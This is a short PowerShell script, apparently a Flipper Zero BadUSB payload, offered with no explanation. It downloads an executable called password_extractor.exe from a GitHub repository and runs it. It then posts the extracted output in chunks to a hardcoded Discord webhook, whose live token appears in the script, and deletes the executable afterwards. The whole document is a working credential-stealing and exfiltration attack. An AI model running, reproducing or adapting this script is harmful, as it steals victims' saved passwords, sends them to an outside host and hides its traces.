$webhookUrl = 'https://discord.com/api/webhooks/1369454757533454356/B2fwEhJqhY2nuEmIoQNaKFAzfe8VWkjHXzZmXFhKNCblp-xT-CgkoOPL6DEf-N4XXNZo';
$exeUrl     = 'https://github.com/aran1910/FlipperPasswordExtractor/raw/refs/heads/master/build/password_extractor.exe';
$exePath    = '.\password_extractor.exe';

if (-not (Test-Path -Path $exePath)) {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath;
}

$output = & $exePath | Out-String;

if ($output) {
    $chunks = [Math]::Ceiling($output.Length / 2000);
    for ($i = 0; $i -lt $chunks; $i++) {
        $start   = $i * 2000;
        $length  = [Math]::Min(2000, $output.Length - $start);
        $content = $output.Substring($start, $length);

        $webhookContent = @{
            'username' = 'Flipper';
            'content'  = $content;
        };

        $jsonData = ConvertTo-Json -InputObject $webhookContent;
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonData -ContentType 'application/json';
        Start-Sleep -Seconds 1;
    }
}

Remove-Item -Path $exePath -Force;
